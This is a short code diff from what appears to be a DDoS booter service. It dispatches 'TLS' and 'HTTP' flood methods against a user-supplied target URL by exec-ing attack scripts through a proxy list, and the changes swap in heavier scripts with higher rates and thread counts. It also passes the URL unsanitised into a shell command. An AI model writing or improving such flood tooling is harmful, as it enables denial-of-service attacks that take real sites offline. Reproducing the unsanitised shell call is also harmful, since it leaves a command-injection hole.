@@ -38,7 +38,7 @@ if (!key || !url || !time || !method) {
                     });
                     }
                     if (method === 'TLS') {
-                        exec(`node TLS-V2.js ${url} ${time} 80 20 proxy.txt`, (error, stdout, stderr) => {  
+                        exec(`node TLSvip.js ${url} ${time} 150 100 proxy.txt`, (error, stdout, stderr) => {  
                         console.log('tls is running');
                     });
                     }
@@ -52,8 +52,8 @@ if (!key || !url || !time || !method) {
                         console.log('http is running');
                     });
                     }
-                    if (method === 'HTTP-LOAD') {
-                        exec(`node HTTP-LOAD.js ${url} ${time} 200 100 proxy.txt`, (error, stdout, stderr) => {  
+                    if (method === 'HTTP') {
+                        exec(`node 404.js ${url} ${time} 200 100 proxy.txt`, (error, stdout, stderr) => {  
                         console.log('http-load is running');
                     });
                     }
